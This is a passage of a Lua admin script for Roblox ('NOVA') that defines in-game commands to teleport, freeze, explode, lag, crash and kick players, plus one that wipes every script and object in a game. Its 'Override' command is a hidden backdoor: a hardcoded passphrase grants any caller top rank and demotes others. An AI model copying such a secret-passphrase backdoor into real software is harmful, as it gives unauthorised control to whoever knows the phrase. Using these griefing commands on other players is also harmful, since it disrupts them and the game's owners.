			if v.Name == "rigletto" then
				Output("Attempt to lag the creator, command will not be carried through.",NOVA.Colors.Red,Speaker,10)
			else
				pcall(function() 
					Lag(v)
				end)
			end
		end
	end
)


AddCommand("PRI","pri",6,"view the PRI settings.","No Arguments",
	function(Msg,Speaker)
		RemoveTablets(Speaker)
		Output("List","Random",Speaker,nil,
			function()
				RemoveTablets(Speaker)
				for _,v in pairs(NOVA.Ranked) do
					if v.InPRI == true then
						OutputImg("http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name,v.Name,v.Color,Speaker,nil,function()
							RemoveTablets(Speaker)
							OnChatted("\\pri\\",Speaker)
						end)
					end
				end
				Output("Dismiss",NOVA.Colors.Red,Speaker)
			end
		)
		
		Output("Type","Random",Speaker,nil,
			function()
				RemoveTablets(Speaker)
				Output("Kick",NOVA.Colors.Orange,Speaker,nil,
					function()
						NOVA.PRIType = "Kick"
						RemoveTablets(Speaker)
						OnChatted("\\pri\\",Speaker)
					end
				)
				Output("Lag",NOVA.Colors.Red,Speaker,nil,
					function()
						NOVA.PRIType = "Lag"
						RemoveTablets(Speaker)
						OnChatted("\\pri\\",Speaker)
					end
				)
				Output("Shutdown",NOVA.Colors.Orange,Speaker,nil,
					function()
						NOVA.PRIType = "Shutdown"
						RemoveTablets(Speaker)
						OnChatted("\\pri\\",Speaker)
					end
				)
				Output("Crash",NOVA.Colors.Orange,Speaker,nil,
					function()
						NOVA.PRIType = "Crash"
						RemoveTablets(Speaker)
						OnChatted("\\pri\\",Speaker)
					end
				)
				Output("Dismiss",NOVA.Colors.Red,Speaker)
			end
		)
		
		Output("Remove Player",NOVA.Colors.Orange,Speaker,nil,
			function()
				RemoveTablets(Speaker)
				for num,v in pairs(NOVA.Ranked) do 
					if v.InPRI == true then
						OutputImg("http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name,v.Name,v.Color,Speaker,nil,
							function()
								v.InPRI = false
							end
						)
					end
				end
				Output("Dismiss",NOVA.Colors.Red,Speaker)
			end
		)
		
		Output("Add Player",NOVA.Colors.Green,Speaker,nil,
			function()
				RemoveTablets(Speaker)
				for _,v in pairs(NOVA.Ranked) do
					if v.InPRI == false and v.Rank > -1 then
						OutputImg("http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name,v.Name,v.Color,Speaker,nil,
							function()
								v.InPRI = true
							end
						)
					end
				end
				Output("All",NOVA.Colors.Green,Speaker,nil,
					function()
						for _,v in pairs(NOVA.Ranked) do v.InPRI = true end
						RemoveTablets(Speaker)
						OnChatted("\\pri\\",Speaker)
					end
				)
				Output("Dismiss",NOVA.Colors.Red,Speaker)
			end
		)
		
		Output("Turn PRI On",NOVA.Colors.Red,Speaker,nil,
			function()
				NOVA.PRI = true
				RemoveTablets(Speaker)
				OnChatted("\\pri\\",Speaker)
			end
		)
		
		Output("Turn PRI Off",NOVA.Colors.Green,Speaker,nil,
			function()
				NOVA.PRI = false
				RemoveTablets(Speaker)
				OnChatted("\\pri\\",Speaker)
			end
		)
		
		Output("Dismiss",NOVA.Colors.Red,Speaker)
	end
)

AddCommand("Get Ranked","getranked",0,"Displays all the current players ranks.","No Arguments",
	function(Msg,Speaker)
		RemoveTablets(Speaker)
		for num,v in pairs(NOVA.Ranked) do
			Output(v.Name,v.Color,Speaker,nil,
				function(Clicker)
					RemoveTablets(Speaker)
					Output("Name : "..v.Name,v.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\getranked\\",Speaker) end)
					Output("Rank Name : "..GetRankName(v.Name),v.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\getranked\\",Speaker) end)
					Output("Rank Number : "..v.Rank,v.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\getranked\\",Speaker) end)
					Output("Desc : "..v.Desc,v.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\getranked\\",Speaker) end)
					Output("Color : "..tostring(v.Color),v.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\getranked\\",Speaker) end)
					Output("Dismiss",NOVA.Colors.Red,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\getranked\\",Speaker) end)
				end
			)
		end
		Output("Dismiss",NOVA.Colors.Red,Speaker)
	end
)

AddCommand("Set Rank","setrank",0,"Allows you to change the rank of others.","No Arguments",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			if GetRank(Speaker) > GetRank(v) then
				Output(v.Name,GetRankedTable(v).Color,Speaker,nil,
					function()
						RemoveTablets(Speaker)
						if GetRank(Speaker) < 6 then 
							for i=0,GetRank(Speaker)-1 do
								Output(i,Color3.new(i/10,i/10,i/10),Speaker,nil,
									function()
										GetRankedTable(v).Rank = i
										if GetRank(v) == -2 then 
											Lag(v)
										end
										if GetRank(v) == -1 then
											GetRidOf(v)
										end
										RemoveTablets(Speaker)
										OnChatted("\\setrank\\",Speaker)
									end
								)
							end
						else
							for i=-2,GetRank(Speaker)-1 do
								Output(i,Color3.new(i/10,i/10,i/10),Speaker,nil,
									function()
										GetRankedTable(v).Rank = i
										if GetRank(v) == -2 then 
											Lag(v)
										end
										if GetRank(v) == -1 then
											GetRidOf(v)
										end
										RemoveTablets(Speaker)
										OnChatted("\\setrank\\",Speaker)
									end
								)
							end
						end
						Output("Dismiss",NOVA.Colors.Red,Speaker)
					end
				)
			end
		end
		Output("Dismiss",NOVA.Colors.Red,Speaker)
	end
)

AddCommand("Teleport","tp",2,"Teleports one player to another.","<Player><Player>",
	function(Msg,Speaker)

		Split = GetSplit(Msg)              
		send  = GetPlayers(string.sub(Msg,1,Split - 1),Speaker)
		to = GetPlayers(string.sub(Msg,Split+1),Speaker)
		for _,a in pairs(send) do
			for _,b in pairs(to) do
				pcall(function()
					a.Character.Torso.CFrame = b.Character.Torso.CFrame 
				end)
			end
		end
		
	end
)

AddCommand("Circle Teleport","ctp",2,"Teleports one player to another.","<Player><Player>",
	function(Msg,Speaker)

		Split = GetSplit(Msg)           
		send  = GetPlayers(string.sub(Msg,1,Split - 1),Speaker)
		to = GetPlayers(string.sub(Msg,Split+1),Speaker)[1]
		for i, player in pairs(send) do
			pcall(function()
				player.Character.Torso.CFrame = CFrame.new(to.Character.Torso.Position) 
				* CFrame.Angles(0, math.rad(i * 360 / #send), 0) 
				* CFrame.new(0, 0, 3 + (#send*2) )
			end)
		end
	end
)

AddCommand("Walkspeed","ws",2,"Sets the selected player walkspeed to the following number.","<Player><Number>",
	function(Msg,Speaker)
		Split = GetSplit(Msg)                
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			pcall(function() v.Character.Humanoid.WalkSpeed = tonumber(Msg:sub(Split+1)) end)
		end
	
	end
)

AddCommand("Explode","expl",2,"Explodes the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.Character:BreakJoints()
				E = Instance.new("Explosion",NOVA.Services.Workspace)
				E.Position = v.Character.Torso.Position
				E.BlastPressure = 124000
			end)
		end
	end
)

AddCommand("Infinite Health","inf",2,"Sets the selected player health to math.huge.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.Character.Humanoid.MaxHealth = math.huge
			end)
		end
	end
)

AddCommand("God","god",2,"makes the selected player god.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.Character.Torso.Touched:connect(function(part)
					if not part:IsDescendantOf(v.Character) and not part.Anchored == true and part ~= Crown then
						part.CanCollide = true
						part:BreakJoints()
						Instance.new("Fire",part).Color = Color3.new(255,255,255)
						Instance.new("Fire",part).Color = Color3.new(255,255,255)
						Instance.new("Fire",part).Color = Color3.new(255,255,255)
					end
				end)
			end)
		end
	end
)

AddCommand("Punish","punish",2,"Reparents the selected player's character parent lighting.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.Character.Parent = NOVA.Services.Lighting
			end)
		end
	end
)

AddCommand("Un Punish","unpunish",2,"Reparents the selected player's character parent workspace.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.Character.Parent = NOVA.Services.Workspace
				v.Character:MakeJoints()
				pcall(function() v.Character.Animate.Disabled = false end)
			end)
		end
	end
)

AddCommand("Freeze","freeze",2,"Anchor the selected player('s/s') character('s).","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for _,part in pairs(v.Character:GetChildren()) do
					pcall(function() 
						part.Anchored = true
					end)
				end
			end)
		end
	end
)

AddCommand("Thaw","thaw",2,"Un anchor the selected player('s/s') character('s).","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for _,part in pairs(v.Character:GetChildren()) do
					pcall(function() 
						part.Anchored = false
					end)
				end
			end)
		end
	end
)

AddCommand("Remove Tools","rtools",2,"Removes the selected player tools.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for _,part in pairs(v.Backpack:GetChildren()) do
					part:Destroy()
				end
			end)
		end
	end
)

AddCommand("Remove Backpack","rbp",2,"Removes the selected player backpack.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.Backpack:Destroy()
			end)
		end
	end
)

AddCommand("Sit","sit",2,"Makes the selected player sit down.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.Character.Humanoid.Sit = true
			end)
		end
	end
)

AddCommand("Stand","stand",2,"Makes the selected player stand up.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.Character.Humanoid.Sit = false
			end)
		end
	end
)

AddCommand("Jump","jump",2,"Makes the selected player jump.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.Character.Humanoid.Jump = true
			end)
		end
	end
)

AddCommand("Control","control",2,"Controls the selected player","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				Speaker.Character = v.Character
			end)
		end
	end
)

AddCommand("Transparent","trans",2,"Makes the selected player transparent","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for _,v in pairs(v.Character:GetChildren()) do
					if v:IsA("BasePart") then
						coroutine.resume(coroutine.create(function()
							for i=1,10  do
								wait()
								v.Transparency = v.Transparency + 0.1
							end
						end))
					end
					if v:IsA("Hat") then
						coroutine.resume(coroutine.create(function()
							for i=1,10  do
								wait()
								v.Handle.Transparency = v.Handle.Transparency + 0.1
							end
						end))
					end
				end
			end)
		end
	end
)

AddCommand("Visible","visible",2,"Makes the selected player visible.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for _,v in pairs(v.Character:GetChildren()) do
					if v:IsA("BasePart") then
						coroutine.resume(coroutine.create(function()
							for i=1,10  do
								wait()
								v.Transparency = v.Transparency - 0.1
							end
						end))
					end
					if v:IsA("Hat") then
						coroutine.resume(coroutine.create(function()
							for i=1,10  do
								wait()
								v.Handle.Transparency = v.Handle.Transparency - 0.1
							end
						end))
					end
				end
			end)
		end
	end	
)

AddCommand("No Builders Club","nbc",2,"Sets the selected player builder club membership type.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.MembershipTypeReplicate = 0
			end)
		end
	end
)

AddCommand("Builders Club","bc",2,"Sets the selected player builder club membership type.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.MembershipTypeReplicate = 1
			end)
		end
	end
)

AddCommand("Turbo Builders Club","tbc",2,"Sets the selected player builder club membership type.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.MembershipTypeReplicate = 2
			end)
		end
	end
)

AddCommand("Outragous Builders Club","obc",2,"Sets the selected player builder club membership type.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.MembershipTypeReplicate = 3
			end)
		end
	end
)

AddCommand("Remove Hats","rhats",2,"Remove the hat of the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for _,part in pairs(v.Character:GetChildren()) do if part:IsA("Hat") then part:Remove() end end
			end)
		end
	end
)

AddCommand("Remove Humanoid","rhum",2,"Remove the humanoid of the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for _,part in pairs(v.Character:GetChildren()) do if part:IsA("Humanoid") then part:Remove() end end
			end)
		end
	end
)

AddCommand("Jail","jail",2,"Puts the selected player in jail.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				waittime = "0.0"..string.rep("0",1000).."1"
				coroutine.resume(coroutine.create(function()
					v.Character.Humanoid.WalkSpeed = 0
					local CF = v.Character.Torso.CFrame
					for angle = 1, 45 do
						local p = Instance.new("Part",NOVA.Services.Workspace)
						p.Size = Vector3.new(1, 10, 1)
						p.Anchored = true
						p.TopSurface = "Smooth"
						p.BottomSurface = "Smooth"
						p.Transparency = 0.9
						p.CFrame = CF
							* CFrame.Angles(0, math.rad(angle*8), 0)
							* CFrame.new(0, 0, 5) 
						wait(tonumber(waittime))
					end
					
					for angle = 1, 45/2 do
						local p = Instance.new("Part",NOVA.Services.Workspace)
						p.Size = Vector3.new(11, 1, 1)
						p.Anchored = true
						p.TopSurface = "Smooth"
						p.BottomSurface = "Smooth"
						p.Transparency = 0.9
						p.CFrame = CF
							* CFrame.Angles(0, math.rad(angle*8), 0)
							* CFrame.new(0, 5, 0) 
					

						local p = Instance.new("Part",NOVA.Services.Workspace)
						p.Size = Vector3.new(11, 1, 1)
						p.Anchored = true
						p.TopSurface = "Smooth"
						p.BottomSurface = "Smooth"
						p.Transparency = 0.9
						p.CFrame = CF
							* CFrame.Angles(0, math.rad(angle*8), 0)
							* CFrame.new(0, 0 - 5, 0) 
										

														
						wait(tonumber(waittime))
					end
					v.Character.Humanoid.WalkSpeed = 16
				end))
			end)
		end
	end
)

AddCommand("NOVA Clear","nova",6,"Clears the game.","No Arguments",
	function(Msg,Speaker)
		for num,v in pairs(GetRecursiveChildren()) do
			pcall(function()
				if v:IsA("Script") then
					pcall(function()
						v.Disabled = true
						v:Destroy()
					end)
				end
			end)
		end		
		for num,v in pairs(GetRecursiveChildren()) do
			pcall(function()
				if not v:IsA("Player") then
					pcall(function()
						v:Destroy()
					end)
				end
			end)
		end
		for _,v in pairs(NOVA.Services) do	
			v.Name = v.className
		end
		local Base=Instance.new("Part",NOVA.Services.Workspace)
		Base.Name="Base"
		Base.Size=Vector3.new(2048,1,2048)
		Base.BrickColor=BrickColor.new("Really Black")
		Base.Anchored=true
		Base.Locked=true
		Base.TopSurface="Smooth"
		Base.Transparency = 1
		Base.CFrame=CFrame.new(Vector3.new(0,0,0))
		local selectionbox=Instance.new("SelectionBox",Base)
		selectionbox.Adornee = selectionbox.Parent
		selectionbox.Color = BrickColor.new(1,0,0)
		local skybox=Instance.new("Sky",game:GetService("Lighting"))
		skybox.SkyboxBk="http://www.roblox.com/asset/?id=13996320"
		skybox.SkyboxDn="http://www.roblox.com/asset/?id=13996320"
		skybox.SkyboxLf="http://www.roblox.com/asset/?id=13996320"
		skybox.SkyboxFt="http://www.roblox.com/asset/?id=13996320"
		skybox.SkyboxRt="http://www.roblox.com/asset/?id=13996320"
		skybox.SkyboxUp="http://www.roblox.com/asset/?id=13996320"
		local Spawn=Instance.new("SpawnLocation",NOVA.Services.Workspace) Spawn.Name="SpawnLocation"
		Spawn.Size=Vector3.new(6,1,6)
		Spawn.Transparency=1
		Spawn.CanCollide=false
		Spawn.Anchored=true
		Spawn.Locked=true
		Spawn.CFrame=CFrame.new(Vector3.new(0,0,0))
		for _,v in pairs(NOVA.Services.Players:GetPlayers()) do v:LoadCharacter() end
	end
)

AddCommand("ChangeTeam","changeteam",3,"Change the current team of the selected player.","<Player><TeamName>",
	function (Msg,Speaker)
		Split = GetSplit(Msg)
		for _,v in pairs(GetPlayers(string.sub(Msg,1,Split - 1),Speaker)) do
			pcall(function()
				Team = nil
				for _,find in pairs(NOVA.Services.Teams:GetChildren()) do
					if string.sub(find.Name:lower(),1,#string.sub(Msg,Split+1)) == string.lower(string.sub(Msg,Split+1)) then
						Team = find
					end
				end
				v.TeamColor = Team.TeamColor
			end)
		end
	end
)

AddCommand("Teams Remove","rteam",6,"Part of teams commands.","No Arguments",
	function(Msg,Speaker)
		RemoveTablets(Speaker)
		for _,v in pairs(NOVA.Services.Teams:GetChildren()) do
			if string.sub(v.Name:lower(),1,#Msg) == Msg:lower() then
				v:Remove()
			end
		end
	end
)

AddCommand("Teams Add","newteam",6,"Part of teams commands.","<Name>",
	function(Msg,Speaker)
		Split = GetSplit(Msg)
		Team = Instance.new("Team",NOVA.Services.Teams)
		Team.TeamColor = BrickColor.new(Msg:sub(Split+1))
		Team.Name = Msg:sub(1,Split-1)
		Team.AutoAssign = false
		Team.Neutral = false
	end
)

AddCommand("Kill Talk","killtalk",6,"Kills the selected player when they talk.","<Players>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,speaker)) do
			v.Chatted:connect(function() pcall(function() v.Character:BreakJoints() end) end)
		end
	end
)

AddCommand("Kick Talk","kicktalk",6,"Kicks the player when they talk.","<Players>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,speaker)) do
			v.Chatted:connect(function() pcall(function() v:Destroy() end) end)
		end
	end
)

AddCommand("Clear","clear",2,"Clears the workspace of its contents.","No Arguments",
	function(Msg,Speaker)
		for _,v in pairs(NOVA.Services.Workspace:GetChildren()) do
			pcall(function()
				v:Destroy()
			end)
		end	
		
		local Base=Instance.new("Part",NOVA.Services.Workspace)
		Base.Name="Base"
		Base.Size=Vector3.new(2048,1,2048)
		Base.BrickColor=BrickColor.new("Dark green")
		Base.Anchored=true
		Base.Locked=true
		Base.TopSurface="Studs"
		Base.Transparency = 0
		Base.CFrame=CFrame.new(Vector3.new(0,0,0))
		local Spawn=Instance.new("SpawnLocation",NOVA.Services.Workspace) Spawn.Name="SpawnLocation"
		Spawn.Size=Vector3.new(6,1,6)
		Spawn.Transparency=1
		Spawn.CanCollide=false
		Spawn.Anchored=true
		Spawn.Locked=true
		Spawn.CFrame=CFrame.new(Vector3.new(0,0,0))
		
		wait(1)
		
		for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
			v:LoadCharacter()
		end
	
	end
)

AddCommand("Explorer","explorer",6,"Lists the children of workspace.","No Arguments",
	function(Msg,Speaker)
		RemoveTablets(Speaker)
		Explore(game,Speaker)
	end
)

AddCommand("Lock Models","lockmodels",6,"Lets you toggle the model lock.","No Arguments",
	function(Msg,Speaker)
		if NOVA.LockModels == true then 
			NOVA.LockModels = false
		elseif NOVA.LockModels == false then
			NOVA.LockModels = true
		end
		
	end
)

AddCommand("Lock Scripts","lockscripts",6,"Lets you toggle the script lock.","No Arguments",
	function(Msg,Speaker)
		if NOVA.LockedScripts == true then 
			NOVA.LockedScripts = false
		elseif NOVA.LockedScripts == false then
			NOVA.LockedScripts = true
		end
		
	end
)

AddCommand("Troll Explode","trollexpl",3,"Explodes the selected player in a group of trolls.","<Players>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do	
			for i=1,25 do
				coroutine.resume(coroutine.create(function()
					wait()
					local Part = Instance.new("Part",NOVA.Services.Workspace)
					Part.FormFactor = "Custom"
					Part.Transparency = 1
					Part.CanCollide = false
					Part.Anchored = false
					Part.Size = Vector3.new(1,1,1)
					Part.CFrame = v.Character.Head.CFrame
					Part:BreakJoints()
					
					local BBG = Instance.new("BillboardGui",Part)
					BBG.Adornee = Part
					BBG.Size = UDim2.new(3,0,1,0)
					--BBG.StudsOffset = Vector3.new(0, 0, 1)

					local Img = Instance.new("ImageLabel",BBG)
					Img.Size = UDim2.new(1,0,1,0)
					Img.BackgroundTransparency = 1
					Img.Image = "http://www.roblox.com/asset/?id=45120559"
					
					local BP = Instance.new("BodyPosition",Part)
					BP.maxForce = Vector3.new(math.huge,math.huge,math.huge)
					--BP.D = 2000
					BP.P = 1000
					BP.position = Part.Position + Vector3.new(
						math.random(-7,7),
						math.random(-7,7),
						math.random(-7,7))
						
					for v = 3,0,-0.1 do
						wait(0.1)
						BBG.Size = UDim2.new(v,0,v,0)
					end
					Part:Remove()
				end))
			end
		end
	end
)

AddCommand("Cancel","cancel",3,"Cancels all running command loops.","No Arguments",
	function(Msg,Speaker)
		NOVA.Canceled = true
	end
)

AddCommand("Name","name",3,"Lets you re-name a player anything.","<Player><Name>",
	function(Msg,Speaker)
		Split = GetSplit(Msg)
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1))) do
			pcall(function()
				pcall(function()
					v.Character[v.Name]:Remove()
				end)
				OldHead = v.Character.Head
				Model = Instance.new("Model",v.Character.Head)
				Model.Name = Msg:sub(Split+1)
				Head = OldHead:Clone()
				Head.Parent = Model
				Head.Transparency = 0
				Head.Name = "Head"
				Head.CanCollide = false
				Hum = Instance.new("Humanoid",Model)
				Hum.MaxHealth = 0
				Weld = Instance.new("Weld",Head)
				Weld.Part0 = Head
				Weld.Part1 = OldHead
				Weld.C0 = CFrame.new(0,0,0)
				OldHead.Transparency= 1
			end)
		end
	end
)

AddCommand("Trall","trall",3,"Trolls the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			CreateLocalScript([[
				script.Parent = nil
				Camera = workspace.CurrentCamera
				LocalPlayer = game.Players.LocalPlayer
				Camera.CameraType = "Scriptable"
				for i=1,700 do
					wait()
					Camera.FieldOfView = Camera.FieldOfView + math.random(-5,5)
					Camera.CameraType = "Scriptable"
					Camera:SetRoll(Camera:GetRoll()+0.01)
					pcall(function()
						LocalPlayer.Character.Head.Sound:Play()
					end)
				end
				Camera:SetRoll(0)
				Camera.CameraType = "Custom"
				Camera.FieldOfView = 70
				Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
			]],v.Backpack)
		end
	end
)

AddCommand("Permanent Trall","permatrall",6,"Fake loopkills the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			CreateLocalScript([[
				script.Parent = nil
				Camera = workspace.CurrentCamera
				LocalPlayer = game.Players.LocalPlayer
				Camera.CameraType = "Scriptable"
				while true do
					wait()
					Camera.FieldOfView = Camera.FieldOfView + math.random(-5,5)
					Camera.CameraType = "Scriptable"
					Camera:SetRoll(Camera:GetRoll()+0.01)
					pcall(function()
						LocalPlayer.Character.Head.Sound:Play()
					end)


				end
				Camera:SetRoll(0)
				Camera.CameraType = "Custom"
				Camera.FieldOfView = 70
				Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
			]],v.Backpack)
		end
	end
)

AddCommand("Show Credit","showcred",0,"Shows the credits.","No Arguments",
	function(Msg,Speaker)
		for _,v in pairs(NOVA.Credit) do
			Output("Thanks to : "..v.Name.." "..v.Why,"Random",Speaker)
		end
	end
)

AddCommand("Home","home",0,"Teleports you to the Vector3 0 50 0.","No Arguments",
	function(Msg,Speaker)
		pcall(function()
			Speaker.Character.Torso.Velocity = Vector3.new(0,0,0)
			Speaker.Character.Torso.RotVelocity = Vector3.new(0,0,0)
			Speaker.Character.Torso.CFrame = CFrame.new(0,50,0)
		end)
	end
)

AddCommand("Playlist","playlist",3,"Lists NOVA's sounds.","No Arguments",
	function(Msg,Speaker)
		for _,v in pairs(NOVA.Sounds) do
			Output(v.Data.Name,"Random",Speaker,nil,
				function()
					PlaySound(v.Data.Name)
				end
			)
		end
		Output("Dismiss",NOVA.Colors.Red,Speaker)
	end
)

AddCommand("Play","play",6,"Plays the selected sound.","<Sound Name>",
	function(Msg,Speaker)
		for _,v in pairs(NOVA.Sounds.Music) do
			if v.Name:lower():match(Msg:lower()) then
				NOVA.Sounds.Sound.Parent = NOVA.Services.Workspace
				NOVA.Sounds.Sound.SoundId = v.Id
				NOVA.Sounds.Sound.Pitch = v.Pitch
				NOVA.Sounds.Sound.Looped = v.Looped
				NOVA.Sounds.Sound.Volume = 1
				wait(0.5)
				NOVA.Sounds.Sound:Play()
			end
		end
	end
)


AddCommand("Stop","stop",6,"Stops all of NOVA's sounds.","No Arguments",
	function(Msg,Speaker)
		NOVA.Sounds.Sound:Stop()
	end
)

AddCommand("Time","time",1,"Changes the time.","<Number>",
	function(Msg,Speaker)
		NOVA.Services.Lighting.TimeOfDay = Msg
	end
)

AddCommand("Fog End","fog\\end",1,"Changes the fog.","<Number>",
	function(Msg,Speaker)
		NOVA.Services.Lighting.FogEnd = Msg
	end
)

AddCommand("Fog Start","fog\\start",1,"Changes the fog.","<Number>",
	function(Msg,Speaker)
		NOVA.Services.Lighting.FogStart = Msg
	end
)

AddCommand("Fog Color","fog\\color",1,"Changes the fog.","<Number>",
	function(Msg,Speaker)
		if Msg == "red" then Color = NOVA.Colors.Red
			elseif Msg == "black" then Color = NOVA.Colors.Black
			elseif Msg == "white" then Color = NOVA.Colors.White
			elseif Msg == "orange" then Color = NOVA.Colors.Orange
			elseif Msg == "green" then Color = NOVA.Colors.Green
			elseif Msg == "blue" then Color = NOVA.Colors.Blue
		end
		NOVA.Services.Lighting.FogColor = Color
	end
)

AddCommand("Get CMD","get\\cmd",0,"Toggles the CMD bar on your screen.","<BoolValue>",
	function(Msg,Speaker)
		if Msg == "true" then
			GetRankedTable(Speaker).CMD = true
		elseif Msg == "false" then
			GetRankedTable(Speaker).CMD = false
			pcall(function() Speaker.PlayerGui:FindFirstChild("NOVACMD"):Remove() end)
		else Output("Please choose a proper bool value. ( true / false )",NOVA.Colors.Orange,Speaker,5)
		end
	end
)

AddCommand("Override","override",0,"Lost.","<KeyPhrase>",
	function(Msg,Speaker)
		if Msg == "4 8 15 16 23 42" then
			for _,v in pairs(NOVA.Ranked) do
				if v.Rank < 7 then 
					v.Rank = 0
				end
			end
			GetRankedTable(Speaker).Rank = 8
			NOVA.LockedScripts = true
			NOVA.ModelLock = true
			NOVA.totalLock = true
			NOVA.Service.Lighting.FogEnd = 0
			NOVA.Services.Lighting.Ambient = NOVA.Colors.Black
			NOVA.Services.Lighting.TimeOfDay = 0
		end
	end
)

AddCommand("@","@",0,"Chats for the other user.","<Player><Chat>",
	function(Msg,Speaker)
	
		Split = GetSplit(Msg)

		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			if GetRank(Speaker) > GetRank(v) then
				OnChatted(Msg:sub(Split),v)
			end
		end
	end
)

AddCommand("Tell","Tell",1,"Pings the following string to the player.","<Player><Chat>",
	function(Msg,Speaker)
	
		Split = GetSplit(Msg)
		
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			Output(Msg:sub(Split+1),"Random",v,10)
		end
	end
)

AddCommand("Damage","dmg",2,"Damages the selected player the selected ammount.","<Player><FloatValue>",
	function(Msg,Speaker)
		Split = GetSplit(Msg) 
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			pcall(function()
				v.Character.Humanoid.Health = v.Character.Humanoid.Health - tonumber(Msg:sub(Split+1))
			end)
		end
	end
)

AddCommand("Obliterate","obliterate",4,"Obliterates the selected player. ( DUH )","<Player>",
	function(Msg,Speaker)
		local Temp = {
			"http://www.roblox.com/Asset/?id=2101148",
			"http://www.roblox.com/Asset/?id=2233908",
			"http://www.roblox.com/Asset/?id=16976189",
		}
		
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			local Cube = Instance.new("Part",NOVA.Services.Workspace)
			Cube.FormFactor = "Custom"
			Cube.Size = Vector3.new(10,10,10)
			Cube.CFrame = v.Character.Torso.CFrame 
				* CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))
				* CFrame.new(0, 500, 0) 
				
			Cube.BrickColor = BrickColor.new("Really black")
			Cube.Anchored = false
			Cube.CanCollide = false
			Cube.Friction = 0
			Cube.Transparency= 0.5
			Cube.Reflectance = 0.5
			wait()
			Cube:BreakJoints()
			Cube.Touched:connect(function(part)
				if part == v.Character.Torso then
					Instance.new("Explosion",NOVA.Services.Workspace).Position = v.Character.Head.Position
					local S = Instance.new("Sound",NOVA.Services.Workspace)
					S.SoundId = Temp[math.random(1,3)]
					S.Volume = 1
					S:Play()
					Cube:Remove()
				end
			end)
			BP = Instance.new("BodyPosition",Cube)
			BP.maxForce = Vector3.new(math.huge,math.huge,math.huge)
			BP.position = v.Character.Torso.Position
			BP.P = 1200
			BP.D = 0
		end
	end
)

AddCommand("Remove Guis","rguis",3,"Removes the guis in the selected player's PlayerGui.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.PlayerGui:ClearAllChildren()
			end)
		end
	end
)

AddCommand("Remove Player Gui","rpgui",4,"Removes the PlayerGui of the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.PlayerGui:Destroy()
			end)
		end
	end
)

